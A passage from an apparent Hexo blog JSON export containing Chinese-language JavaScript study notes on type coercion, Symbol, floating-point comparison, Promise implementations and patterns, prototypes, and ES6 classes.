//没有找到匹配&#125; 隐式类型转换在隐式转换中，我们可能最大的疑惑是 ：何时发生隐式转换？ 我们这里可以归纳为两种情况发生隐式转换的场景： 比较运算（==、!=、&gt;、&lt;）、if、while需要布尔值地方 算术运算（+、-、*、/、%） 除了上面的场景，还要求运算符两边的操作数不是同一类型 自动转换为布尔值在需要布尔值的地方，就会将非布尔值的参数自动转为布尔值，系统内部会调用Boolean函数 可以得出个小结： undefined null false +0 -0 NaN “” 除了上面几种会被转化成false，其他都换被转化成true 自动转换成字符串遇到预期为字符串的地方，就会将非字符串的值自动转为字符串 具体规则是：先将复合类型的值转为原始类型的值，再将原始类型的值转为字符串 常发生在+运算中，一旦存在字符串，则会进行字符串拼接操作 123456781&#x27;5&#x27; + 1 // &#x27;51&#x27;2&#x27;5&#x27; + true // &quot;5true&quot;3&#x27;5&#x27; + false // &quot;5false&quot;4&#x27;5&#x27; + &#123;&#125; // &quot;5[object Object]&quot;5&#x27;5&#x27; + [] // &quot;5&quot;6&#x27;5&#x27; + function ()&#123;&#125; // &quot;5function ()&#123;&#125;&quot;7&#x27;5&#x27; + undefined // &quot;5undefined&quot;8&#x27;5&#x27; + null // &quot;5null&quot; 自动转换成数值除了+有可能把运算子转为字符串，其他运算符都会把运算子自动转成数值 12345678910111&#x27;5&#x27; - &#x27;2&#x27; // 32&#x27;5&#x27; * &#x27;2&#x27; // 103true - 1 // 04false - 1 // -15&#x27;1&#x27; - 1 // 06&#x27;5&#x27; * [] // 07false / &#x27;5&#x27; // 08&#x27;abc&#x27; - 1 // NaN9null + 1 // 110undefined + 1 // NaNnull`转为数值时，值为`0` 。`undefined`转为数值时，值为`NaN ||和&amp;&amp;在JS中||和&amp;&amp;返回的是两个操作数中的一个 ||和&amp;&amp;首先会对第一个操作数(a和c)执行条件判断，如果其不是布尔值，就进行TooBoolean强制类型转换，然后再进行条件判断 对于||: 如果条件判断结果为true返回第一个操作数，为false则返回第二个操作数的值。 &amp;&amp;则相反，如果条件判断结果为true返回第二个操作数，如果为fakse返回第一个操作数 a||b相当于a?a:b; a&amp;&amp;b相当于a?b:a 常见的用|| 123456function foo(a,b)&#123; a=a||&quot;hello&quot;;//检查变量a如果未赋值则赋值一个默认值hello b=b||&quot;world&quot;; console.log(a+&quot; &quot;+b);&#125; &amp;&amp;： 12345function foo()&#123;&#125;var a=42;a&amp;&amp;foo();//foo()只有在条件判断a通过时才会调用foo();如果条件判断未通过，则a&amp;&amp;foo()就会终止","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"真值假值","slug":"真值假值","date":"2022-04-18T10:06:31.000Z","updated":"2022-04-18T10:10:57.615Z","comments":true,"path":"2022/04/18/真值假值/","link":"","permalink":"https://coloey.github.io/2022/04/18/%E7%9C%9F%E5%80%BC%E5%81%87%E5%80%BC/","excerpt":"","text":"假值： undefined null false +0 -0 NAN “ “ 假值列表以外的其他对象为真值 假值对象 封装了假值的对象为true","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"原生构造函数的原型","slug":"原生构造函数的原型","date":"2022-04-18T09:34:33.000Z","updated":"2022-04-18T09:39:24.328Z","comments":true,"path":"2022/04/18/原生构造函数的原型/","link":"","permalink":"https://coloey.github.io/2022/04/18/%E5%8E%9F%E7%94%9F%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0%E7%9A%84%E5%8E%9F%E5%9E%8B/","excerpt":"","text":"Js为基本数据类型提供了封装对象，称为原生函数（String,Number,Boolean等） 原生构造函数都有自己的prototype对象，这些对象包含其对应子类型所特有的行为特征 有些原生原型不是普通对象 123456console.log(typeof Function.prototype)//functionconsole.log(typeof RegExp.prototype)//objectconsole.log(Function.prototype);//空函数console.log(Array.prototype.length);//0,空数组console.log(RegExp.prototype.toString())//&quot;/?:/&quot;空正则表达式","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"Symbol","slug":"Symbol","date":"2022-04-18T09:11:47.000Z","updated":"2022-04-18T09:30:23.603Z","comments":true,"path":"2022/04/18/Symbol/","link":"","permalink":"https://coloey.github.io/2022/04/18/Symbol/","excerpt":"","text":"Symbol是具有唯一性的特殊标识符，符号可以用作属性名，但无论是在代码还是控制开发台都无法查看和访问它的值，只会显示Symbol(Symbol.create)类似的值 ES6中有预定义的符号，以Symbol的静态属性形式出现，如Symbol.create,Symbol.iterator，可以这样使用： 1obj[Symbol.iterator]=function()&#123;&#125; 可以使用Symbol(…)原生构造函数来自定义符号，但是不能用new 1234567var mysym=Symbol(&quot;my on symbol&quot;)console.log(mysym.toString())//Symbol(my on symbol)console.log(typeof mysym);//symbolvar a=&#123;&#125;a[mysym]=&quot;foorbar&quot;console.log(Object.getOwnPropertySymbols(a));//通常用来命名私有或特殊属性，替代下划线(_)前缀的属性//[Symbol(my on symbol)] Symbol不是对象，是一种简单的标量基本类型","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"小数安全问题","slug":"小数安全问题","date":"2022-04-18T04:04:53.000Z","updated":"2022-04-18T04:10:33.394Z","comments":true,"path":"2022/04/18/小数安全问题/","link":"","permalink":"https://coloey.github.io/2022/04/18/%E5%B0%8F%E6%95%B0%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/","excerpt":"","text":"二进制浮点数中0.1和0.2并不精确，它们相加的结果并非刚好等于0.3,所以结果为false,可以设置一个误差范围值，通常称为机器精度，对于javaScript来说，通常是2^-52 从ES6开始，该值定义为Number.EPSILON 123456function numberCloseEnoughToEqual(n1,n2)&#123; return Math.abs(n1-n2)&lt;Number.EPSILON&#125;var a=0.1+0.2;var b=0.3;console.log(numberCloseEnoughToEqual(a,b));","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"异步函数策略","slug":"异步函数策略","date":"2022-04-16T03:35:37.000Z","updated":"2022-05-29T07:46:23.051Z","comments":true,"path":"2022/04/16/异步函数策略/","link":"","permalink":"https://coloey.github.io/2022/04/16/%E5%BC%82%E6%AD%A5%E5%87%BD%E6%95%B0%E7%AD%96%E7%95%A5/","excerpt":"","text":"实现sleep123456789async function sleep(delay)&#123; return new Promise((resolve)=&gt;setTimeout(resolve,delay)); &#125; async function foo()&#123; const t0=Date.now(); await sleep(1500);//暂停1500ms,await会期望等到一个实现thenable接口的对象，没有的话也会将其包装为promise console.log(Date.now()-t0); &#125; 实现平行加速promise没有按顺序执行，但是await按顺序接收到每个promise的值 1234567891011121314151617181920async function randomDelay(id)&#123; const delay=Math.random()*1000; return new Promise((resolve)=&gt;setTimeout(()=&gt;&#123; console.log(`$&#123;id&#125; finished`); resolve() &#125;,delay)) &#125; async function foo()&#123; const t0=Date.now() const p0=randomDelay(0); const p1=randomDelay(1); const p2=randomDelay(2); const p3=randomDelay(3); await p0; await p1; await p2; await p3; setTimeout(console.log,0,`$&#123;Date.now()-t0&#125; ms elapsed`) &#125; foo(); 12345678910111213141516async function randomDelay(id)&#123; const delay=Math.random()*1000; return new Promise((resolve)=&gt;setTimeout(()=&gt;&#123; console.log(`$&#123;id&#125; finished`); resolve(id) &#125;,delay)) &#125; async function foo()&#123; const t0=Date.now() const promises=Array(5).fill(null).map((key,index)=&gt;randomDelay(index)); for(const p of promises)&#123; console.log(`awaited $&#123;await p&#125;`) &#125; setTimeout(console.log,0,`$&#123;Date.now()-t0&#125; ms elapsed`) &#125; foo(); Promise.all原理只有传入的所有Promise都完成，返回promise才能完成，如果有任何promise被拒绝，返回的主promise就立即拒绝（抛弃任何其他promise的结果），如果全部完成，你会得到一个数组，其中包含传入的所有promise的完成值，对于拒绝的情况，你只会的到第一个拒绝promise的拒绝理由值，这种模式成为门，所有人到齐了才开门,传入空数组会立即完成 12345678910111213Promise.all=function(promises)&#123; const res=[]; return new Promise((resolve,reject)=&gt;&#123; promises.forEach(promise=&gt;&#123; promise.then((value,index)=&gt;&#123; res[idx]=value;//解析promise里面的值 if(res.length==promises.length)&#123; resolve(res) &#125; &#125;,reason=&gt;reject(reason)) &#125;) &#125;) &#125; 例： 12345678910111213141516171819 function runAsync (x) &#123; const p = new Promise(r =&gt; setTimeout(() =&gt; r(x, console.log(x)), 1000)) return p&#125;function runReject (x) &#123; const p = new Promise((res, rej) =&gt; setTimeout(() =&gt; rej(`Error: $&#123;x&#125;`, console.log(x)), 1000 * x)) return p&#125;Promise.all([runAsync(1), runReject(4), runAsync(3), runReject(2)]) .then(res =&gt; console.log(res)) .catch(err =&gt; console.log(err))// 1s后输出13// 2s后输出2Error: 2// 4s后输出4 Promise.race():只有第一个决议的promise取胜，并且决议结果成为返回promise的决议。其他任务虽然会继续进行，但是race已经不管那些任务的结果了，不能传入空数组，传入空数组promise.race()会挂住，且永远不会决议 1234567891011function runAsync (x) &#123; const p = new Promise(r =&gt; setTimeout(() =&gt; r(x, console.log(x)), 1000)) return p&#125;Promise.race([runAsync(1), runAsync(2), runAsync(3)]) .then(res =&gt; console.log(&#x27;result: &#x27;, res)) .catch(err =&gt; console.log(err))//1&#x27;result: &#x27; 123 Promise.race()原理:1234567891011121314151617181920Promise.race=function(promises)&#123; promises=Array.from(promises); return new Promise((resolve,reject)=&gt;&#123; if(promises.length===0)&#123; return;//空数组挂起 &#125; else&#123; for(let i=0;i&lt;promises.length;i++)&#123; Promise.resolve(promises[i]).then((data)=&gt;&#123; resolve(data); return;//只会返回第一个先resolve的，其他resolve的race不管 &#125;,(err)=&gt;&#123; reject(err); return; &#125;) &#125; &#125; &#125;)&#125; Promise.resolve()原理12345678910111213Promsie.resolve=function(param)&#123; if(param instanceof Promise)return param;//如果param本身是promise,则直接返回 return new Promise((resolve,reject)=&gt;&#123; if(param &amp;&amp;typeof param===&#x27;object&#x27;&amp;&amp; typeof param.then===&#x27;function&#x27;)&#123;//如果param是个对象并且param是thenable setTimeout(()=&gt;&#123;//则返回的promise会跟随这个thenable的对象，采用最终状态 param.then(resolve,reject); &#125;) &#125;else&#123; resolve(param)//如果param是值，则直接以该值为成功状态返回 &#125; &#125;)&#125; Promise.reject()12345Promise.reject=function(reason)&#123; return new Promise((resolve,reject)=&gt;&#123; return reject(reason) &#125;)&#125; Promise.catch()123Promsie.prototype.catch=function(onRejected)&#123; return this.then(null,onRejected);//catch后可以继续.then因此调用this.then后可以返回一个新的promise继续.then&#125; Promise.finally():1234567891011Promise.prototype.finally=function(cb)&#123; return this.then((value)=&gt;&#123; return Promise.resolve(callback).then(()=&gt;&#123; return value;//finally后可以继续.then因此调用this.then后可以返回一个新的promise继续.then &#125;) &#125;,(err)=&gt;&#123; return Promise.resolve(callback).then(()=&gt;&#123; throw err; &#125;) &#125;)&#125; 每隔一秒打印1,2,3123const arr=[1,2,3]; arr.reduce( (p,x)=&gt;p.then(()=&gt;new Promise(resolve=&gt;setTimeout(()=&gt;resolve(console.log(x)),1000))),Promise.resolve()) 一秒后打印出1，2,3 123arr.reduce( (p,x)=&gt;p.then(new Promise(resolve=&gt;setTimeout(resolve(console.log(x)),1000))),Promise.resolve() ) 红绿灯交替闪烁123456789101112131415161718192021222324252627282930function red()&#123; console.log(&quot;red&quot;) &#125; function yellow()&#123; console.log(&quot;yellow&quot;) &#125; function green()&#123; console.log(&quot;green&quot;) &#125; const light=(time,cb)=&gt;&#123; return new Promise(resolve=&gt;&#123; setTimeout(()=&gt;&#123; cb(); resolve(); &#125;,time) &#125;) &#125; const step=function()&#123; Promise.resolve() .then(()=&gt;&#123; return light(3000,red) &#125;) .then(()=&gt;&#123; return light(2000,yellow) &#125;) .then(()=&gt;&#123; return light(1000,green) &#125;)&#125; step(); mergepromise 123456789101112131415161718192021222324252627282930313233343536const time = (timer) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve() &#125;, timer) &#125;)&#125;const ajax1 = () =&gt; time(2000).then(() =&gt; &#123; console.log(1); return 1&#125;)const ajax2 = () =&gt; time(1000).then(() =&gt; &#123; console.log(2); return 2&#125;)const ajax3 = () =&gt; time(1000).then(() =&gt; &#123; console.log(3); return 3&#125;)function mergePromise (promises) &#123; // 在这里写代码 let data=[] let promise=Promise.resolve(); promises.forEach(ajax=&gt;&#123; //第一次then是调用ajax,第二次then是解析ajax的结果 promise=promise.then(ajax).then(res=&gt;&#123;data.push(res);return data&#125;)//把每次结果返回 &#125;) return promise; &#125;mergePromise([ajax1, ajax2, ajax3]).then(data =&gt; &#123; console.log(&quot;done&quot;); console.log(data); // data 为 [1, 2, 3]&#125;); 异步加载图片 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849function loadImage(url)&#123; return new Promise((resolve,reject)=&gt;&#123; const img=new Image(); img.onload=function()&#123; console.log(&quot;一张图片加载完成&quot;) resolve(img) &#125; img.onerror=function()&#123; reject(new Error(&quot;Cannot load&quot;+url)); &#125; img.src=url; &#125;)&#125;var urls = [ &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting1.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting2.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting3.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting4.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/AboutMe-painting5.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn6.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn7.png&quot;, &quot;https://hexo-blog-1256114407.cos.ap-shenzhen-fsi.myqcloud.com/bpmn8.png&quot;,];function limitedLoad(urls,handler,limit)&#123; let sequence=[...urls]; let promises=sequence.splice(0,limit).map((url,index)=&gt;&#123; return handler(url).then(index=&gt;&#123; return index;//调用loadImage返回最先加载完成的那张照片下标 &#125;) &#125;) return sequence.reduce( (p,url)=&gt;&#123; return p.then(()=&gt;&#123;return Promise.race(promises)&#125;)//得到第一张加载完成的图片的下标 .then(fastIndex=&gt;&#123;promises[fastIndex]=handler(url).then(()=&gt;&#123;return fastIndex&#125;)&#125;)//将已经加载完成的照片的位置替换为为加载的照片 .catch(err=&gt;&#123;console.error(err)&#125;) &#125;,Promise.resolve())//初始为Promise.resolve() .then(()=&gt;&#123;return Promise.all(promises)&#125;)//最后3个用Promise.all加载&#125;limitedLoad(urls,loadImage,3).then(res=&gt;&#123; console.log(&quot;图片全部加载完成&quot;) console.log(res)&#125;).catch(err=&gt;&#123; console.error(err)&#125;) 判断图片是否加载延迟12345678910111213141516171819202122232425function loadImage(url)&#123; return new Promise((resolve,reject)=&gt;&#123; const img=new Image(); img.onload=function()&#123; console.log(&quot;一张图片加载完成&quot;) resolve(img) &#125; img.onerror=function()&#123; reject(new Error(&quot;Cannot load&quot;+url)); &#125; img.src=url; &#125;)&#125;function timeout()&#123; var p=new promise((resolve,reject)=&gt;&#123; setTimeout(()=&gt;&#123; reject(&#x27;图片超时&#x27;) &#125;,5000) &#125;)&#125;Promise.race([loadImage(),timeout()]).then((data)=&gt;&#123; console.log(data);&#125;).catch((err)=&gt;&#123; console.log(err)&#125;)","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[{"name":"手撕代码","slug":"手撕代码","permalink":"https://coloey.github.io/tags/%E6%89%8B%E6%92%95%E4%BB%A3%E7%A0%81/"},{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/tags/JavaScript/"}]},{"title":"面向对象的原型模式和对象关联区别","slug":"面向对象的原型模式和对象关联区别","date":"2022-04-15T08:10:58.000Z","updated":"2022-04-15T08:57:12.807Z","comments":true,"path":"2022/04/15/面向对象的原型模式和对象关联区别/","link":"","permalink":"https://coloey.github.io/2022/04/15/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8E%9F%E5%9E%8B%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%AF%B9%E8%B1%A1%E5%85%B3%E8%81%94%E5%8C%BA%E5%88%AB/","excerpt":"","text":"面向对象的原型模式：1234567891011121314151617function Foo(who)&#123; this.me=who &#125; Foo.prototype.identify=function()&#123; return &quot;I am &quot;+this.me &#125; function Bar(who)&#123; Foo.call(this,who) &#125; Bar.prototype=Object.create(Foo.prototype); Bar.prototype.speak=function()&#123; alert(&quot;Hello&quot;+this.identify()+&quot;.&quot;) &#125; var b1=new Bar(&quot;b1&quot;); var b2=new Bar(&quot;b2&quot;); b1.speak(); b2.speak(); 对象关联的委托模式123456789101112131415Foo=&#123; init:function(who)&#123;this.me=who&#125;, identify:function()&#123;return &quot;I am &quot;+this.me&#125; &#125; Bar=Object.create(Foo); Bar.speak=function()&#123; alert(&quot;Hello&quot;+this.identify()+&quot;.&quot;) &#125; var b1=Object.create(Bar) b1.init(&quot;b1&quot;); var b2=Object.create(Bar) b2.init(&quot;b2&quot;); b1.speak(); b2.speak(); 类设计模式1234567891011121314151617181920212223class Foo&#123; constructor(who)&#123; var me=who &#125; identify()&#123; return &quot;I am &quot;+this.me &#125; &#125; class Bar extends Foo&#123; constructor(who)&#123; super();//这里super指的是父类的构造函数，相当于Foo.prototype.constructor.call(this);this指的是子类Bar this.me=who &#125; speak()&#123; alert(&quot;hello&quot;+super.identify())//这里super作为对象，指的是父类的原型对象，相当于Foo.prototype &#125; &#125; var b1=new Bar(&#x27;b1&#x27;); b1.speak(); var b2=new Bar(&#x27;b2&#x27;); b2.speak();","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"prototype,__proto__与costructor","slug":"prototype-proto-与costructor","date":"2022-04-15T05:21:41.000Z","updated":"2022-05-02T15:57:23.976Z","comments":true,"path":"2022/04/15/prototype-proto-与costructor/","link":"","permalink":"https://coloey.github.io/2022/04/15/prototype-proto-%E4%B8%8Ecostructor/","excerpt":"","text":"本文转载自（ []: https://blog.csdn.net/cc18868876837/article/details/81211729） 文章目录 前言 _ _ proto _ _ 属性 prototype属性 constructor属性 总结提示：不要排斥，静下心来，认真读完，你就搞懂了！(可以先看一下最后的总结部分再回过头来完整看完) 前言 作为一名前端工程师，必须搞懂JS中的prototype、_proto__与constructor属性，相信很多初学者对这些属性存在许多困惑，容易把它们混淆，本文旨在帮助大家理清它们之间的关系并彻底搞懂它们。这里说明一点，__proto__属性的两边是各由两个下划线构成（这里为了方便大家看清，在两下划线之间加入了一个空格： proto _，读作“dunder proto”，“double underscore proto”的缩写），实际上，该属性在ES标准定义中的名字应该是[[Prototype]]，具体实现是由浏览器代理自己实现，谷歌浏览器的实现就是将[[Prototype]]命名为__proto__，大家清楚这个标准定义与具体实现的区别即可（名字有所差异，功能是一样的），可以通过该方式检测引擎是否支持这个属性：Object.getPrototypeOf({proto: null}) === null。本文基于谷歌浏览器（版本 72.0.3626.121）的实验结果所得。 现在正式开始！ 让我们从如下一个简单的例子展开讨论，并配以相关的图帮助理解： 1234function Foo() &#123;...&#125;;let f1 = new Foo(); 以上代码表示创建一个构造函数Foo()，并用new关键字实例化该构造函数得到一个实例化对象f1。这里稍微补充一下new操作符将函数作为构造器进行调用时的过程：函数被调用，然后新创建一个对象，并且成了函数的上下文（也就是此时函数内部的this是指向该新创建的对象，这意味着我们可以在构造器函数内部通过this参数初始化值），最后返回该新对象的引用，详细请看：详解JavaScript中的new操作符。虽然是简简单单的两行代码，然而它们背后的关系却是错综复杂的，如下图所示： 看到这图别怕，让我们一步步剖析，彻底搞懂它们！ 图的说明：右下角为图例，红色箭头表示__proto__属性指向、绿色箭头表示prototype属性的指向、棕色实线箭头表示本身具有的constructor属性的指向，棕色虚线箭头表示继承而来的constructor属性的指向；蓝色方块表示对象，浅绿色方块表示函数（这里为了更好看清，Foo()仅代表是函数，并不是指执行函数Foo后得到的结果，图中的其他函数同理）。图的中间部分即为它们之间的联系，图的最左边即为例子代码。 __ proto __ 属性 首先，我们需要牢记两点： ①____proto____和constructor属性是对象所独有的；② prototype属性是函数所独有的。但是由于JS中函数也是一种对象，所以函数也拥有__proto__和constructor属性，这点是致使我们产生困惑的很大原因之一。上图有点复杂，我们把它按照属性分别拆开，然后进行分析： 第一，这里我们仅留下 proto 属性，它是对象所独有的，可以看到__proto__属性都是由一个对象指向一个对象，即指向它们的原型对象（也可以理解为父对象），那么这个属性的作用是什么呢？它的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（可以理解为父对象）里找，如果父对象也不存在这个属性，则继续往父对象的__proto__属性所指向的那个对象（可以理解为爷爷对象）里找，如果还没找到，则继续往上找…直到原型链顶端null（可以理解为原始人。。。），再往上找就相当于在null上取值，会报错（可以理解为，再往上就已经不是“人”的范畴了，找不到了，到此结束，null为原型链的终点），由以上这种通过__proto__属性来连接对象直到null的一条链即为我们所谓的原型链。 其实我们平时调用的字符串方法、数组方法、对象方法、函数方法等都是靠__proto__继承而来的。 prototype属性 第二，接下来我们看 prototype 属性： prototype属性，别忘了一点，就是我们前面提到要牢记的两点中的第二点，它是函数所独有的，（除了Object基本类型），它是从一个函数指向一个对象。它的含义是函数的原型对象，也就是这个函数（其实所有函数都可以作为构造函数)所创建的实例的原型对象，由此可知：f1.proto === Foo.prototype，它们两个完全一样。那prototype属性的作用又是什么呢？它的作用就是包含可以由特定类型的所有实例共享的属性和方法，也就是让该函数所实例化的对象们都可以找到公用的属性和方法。任何函数在创建的时候，其实会默认同时创建该函数的prototype对象。 constructor属性 最后，我们来看一下 constructor 属性： constructor属性也是对象才拥有的，它是从一个对象指向一个函数，含义就是指向该对象的构造函数，每个对象都有构造函数（本身拥有或继承而来，继承而来的要结合__proto__属性查看会更清楚点，如下图所示），从上图中可以看出Function这个对象比较特殊，它的构造函数就是它自己（因为Function可以看成是一个函数，也可以是一个对象)，所有函数和对象最终都是由Function构造函数得来，所以constructor属性的终点就是Function这个函数。 感谢网友的指出，这里解释一下上段中“每个对象都有构造函数”这句话。这里的意思是每个对象都可以找到其对应的constructor，因为创建对象的前提是需要有constructor，而这个constructor可能是对象自己本身显式定义的或者通过proto在原型链中找到的。而单从constructor这个属性来讲，只有prototype对象才有。每个函数在创建的时候，JS会同时创建一个该函数对应的prototype对象，而函数创建的对象.proto === 该函数.prototype，该函数.prototype.constructor===该函数本身，故通过函数创建的对象即使自己没有constructor属性，它也能通过__proto__找到对应的constructor，所以任何对象最终都可以找到其构造函数（null如果当成对象的话，将null除外）。如下： 总结 总结一下： 我们需要牢记两点： ①__proto__和constructor属性是对象所独有的； ② prototype属性是函数所独有的，因为函数也是一种对象，所以函数也拥有__proto__和constructor属性。__proto__属性的作用就是当访问一个对象的属性时，如果该对象内部不存在这个属性，那么就会去它的__proto__属性所指向的那个对象（父对象）里找，一直找，直到__proto__属性的终点null，再往上找就相当于在null上取值，会报错。通过__proto__属性将对象连接起来的这条链路即我们所谓的原型链。prototype属性的作用就是让该函数所实例化的对象们都可以找到公用的属性和方法，即f1.proto === Foo.prototype。constructor属性的含义就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function。 本文就此结束了，希望对那些对JS中的prototype、__proto__与constructor属性有困惑的同学有所帮助。 最后，感谢这两篇博文，本文中的部分内容参考自这两篇博文： 一张图理解prototype、proto和constructor的三角关系prototype和__proto__的关系是什么？小彩蛋：实现继承（相对完美、优雅） 123456789101112131415161718192021222324function inherit(Child, Parent) &#123; // 继承原型上的属性 Child.prototype = Object.create(Parent.prototype) // 修复 constructor Child.prototype.constructor = Child // 存储超类 Child.super = Parent // 静态属性继承 if (Object.setPrototypeOf) &#123; // setPrototypeOf es6 Object.setPrototypeOf(Child, Parent) &#125; else if (Child.__proto__) &#123; // __proto__ es6 引入，但是部分浏览器早已支持 Child.__proto__ = Parent &#125; else &#123; // 兼容 IE10 等陈旧浏览器 // 将 Parent 上的静态属性和方法拷贝一份到 Child 上，不会覆盖 Child 上的方法 for (var k in Parent) &#123; if (Parent.hasOwnProperty(k) &amp;&amp; !(k in Child)) &#123; Child[k] = Parent[k] &#125; &#125; &#125;&#125;","categories":[{"name":"JavaScript","slug":"JavaScript","permalink":"https://coloey.github.io/categories/JavaScript/"}],"tags":[]},{"title":"类","slug":"类","date":"2022-04-15T02:03:02.000Z","updated":"2022-04-15T14:21:17.594Z","comments":true,"path":"2022/04/15/类/","link":"","permalink":"https://coloey.github.io/2022/04/15/%E7%B1%BB/","excerpt":"","text":"类构造函数方法名constructor会告诉解释器在使用new操作符创建类的新实例时，应该调用这个函数，构造函数的定义不是必须的，不定义构造函数相当于将构造函数定义为空函数 使用new调用类的构造函数会执行如下操作： 在内存中创建一个新对象 这个新对象内部的[[Prototype]]即__proto__指针被赋值为构造函数的prototype属性 构造函数内部的this被赋值为这个新对象（即this指向新对象） 执行构造函数内部的代码（给新对象添加属性） 如果构造函数返回非空对象，则返回该对象；否则，返回刚创建的新对象 12345class Person&#123; &#125; let p1=new Person(); console.log(p1.__proto__===Person.prototype);//true 默认情况下，类构造函数会在执行后返回this对象，构造函数返回的对象会被用作实例化的对象，如果没用引用新创建的this对象，那么这个对象会被销毁。不过，如果，返回的不是this对象，而是其他对象，那么这个对象不会通过instanceof操作符检测出跟类有关联。 123456789101112131415class Person&#123; constructor(override)&#123; this.foo=&quot;foo&quot;; if(override)&#123; return &#123; bar:&quot;bar&quot; &#125; &#125; &#125; &#125; let p1=new Person(),p2=new Person(true); console.log(p1) console.log(p1 instanceof Person); console.log(p2);//没有引用构造函数创建的this对象，对象被销毁而返回的其他对象与类没有关系 console.log(p2 instanceof Person) 类构造函数与普通构造函数区别调用类构造函数必须使用new操作符，而普通构造函数如果不使用new调用，那么就会以全局的this作为内部对象，调用类构造函数没有使用new则会抛出错误 1let p3=Person();//TypeError 类构造函数在实例化后，可以在实例上引用它 1234class Person&#123;&#125;let p1=new Person();//使用对类构造函数的引用创建一个新实例let p2=new p1.constructor(); 把类当成特殊的函数123class Person&#123;&#125;console.log(Person);//class Person&#123;&#125;console.log(typeof Person)//function 类标识符有prototype属性，而这个原型也有一个constructor属性指向类自身 1234class Person&#123; &#125; console.log(Person===Person.prototype.constructor);//true 使用instanceof检查一个对象和类构造函数，以确定对象是不是类的实例。 12let p=new Person();console.log(p instanceof Person)//true 类本身具有和普通构造函数一样的行为，在类的上下文中，类本身使用new调用时就被当做构造函数，类中的constructor方法不会被当做构造函数， 123456789101112class Person&#123; &#125; let p1=new Person(); console.log(p1 instanceof Person);//true console.log(p1.constructor=== Person);//true console.log(p1 instanceof Person.constructor)//false let p2=new Person.constructor(); console.log(p2 instanceof Person)//false console.log(p2 .constructor=== Person);//false console.log(p2 instanceof Person.constructor)//true 实例，原型和类成员实例成员每次通过new调用类标识符时都会执行类构造函数，可以为新创建的实例this添加自有属性。每个实例都对应一个唯一的成员对象，所有成员都不会在原型上共享 123456789101112class Person&#123; constructor()&#123; this.name=new String(&#x27;Jack&#x27;); this.sayName=()=&gt;console.log(this.name); &#125; sayAge(age)&#123; console.log(age) &#125; &#125; let p1=new Person(),p2=new Person(); console.log(p1.name===p2.name)//false console.log(p1.sayAge(18)===p2.sayAge(19))//true 原型方法为了在实例间共享方法，类定义语法在类块中定义的方法作为原型方法 12 //在类块中定义的所有内容都会定义在类的原型上console.log(p1.sayAge===Person.prototype.sayAge);//true 可以把方法定义在类构造函数或者类块中，但不能在类块给原型添加原始值或对象作为成员数据,但是可以在类块外部手动添加成员数据 1Person.greeting=&quot;My name is&quot; 类方法等同于对象属性因此可以使用字符串，符号或计算的值作为键, 也支持获取和设置访问器 12345678910111213141516171819202122232425const symbolKey=Symbol(&#x27;symbolkey&#x27;);class Person()&#123; stringKey()&#123; console.log(&#x27;invoked stringKey&#x27;) &#125; [symbolKey]()&#123; console.log(&#x27;invoked symbolKey&#x27;) &#125; [&#x27;computed&#x27;+&#x27;Key&#x27;]()&#123; console.log(&#x27;invoked computedKey&#x27;) &#125; set name(newvalue)&#123; this.name_=newName; &#125; get name()&#123; return this.name_ &#125;&#125;let p=new Person()p.stringKey();p[symbolKey]();p.computedKey();p.name=&#x27;jake&#x27;;console.log(p.name);//Jake 静态类方法这些方法通常用于执行不特定于实例的操作，也不要求存在类的实例 与原型成员类似，静态成员每个类上只能有一个 静态类成员在类定义中使用static关键字作为前缀，在静态成员中，this引用类自身，其他所有约定跟原型成员一样，静态类方法适合作为实例工厂 12345678910111213class Person&#123; constructor()&#123; this.name=new String(&#x27;Jack&#x27;); this.sayName=()=&gt;console.log(this.name); &#125; sayAge(age)&#123; console.log(age) &#125; static create()&#123; return new Person(Math.floor(Math.random()*100)) &#125; &#125; console.log(Person.create())//Person &#123;name: String, sayName: ƒ&#125;name: String &#123;&#x27;Jack&#x27;&#125;sayName: ()=&gt;console.log(this.name)[[Prototype]]: Object 关于继承[]: https://www.bookstack.cn/read/es6-3rd/spilt.1.docs-class-extends.md 关于super[]: https://www.bookstack.cn/read/es6-3rd/spilt.3.docs-class-extends.md 抽象基类通过new.target保存通过new关键字调用的类或函数，在普通函数中调用new.target返回undefined,通过在实例化时检测new.target是不是抽象基类，可以阻止对抽象基类的实例化 1234567891011class Vehicle&#123; constructor()&#123; console.log(new.target); if(new.target===Vehicle)&#123; throw new Error(&#x27;Vehicle cannot be directly instantiated&#x27;) &#125; &#125; &#125; class Bus extends Vehicle&#123;&#125; new Bus(); new 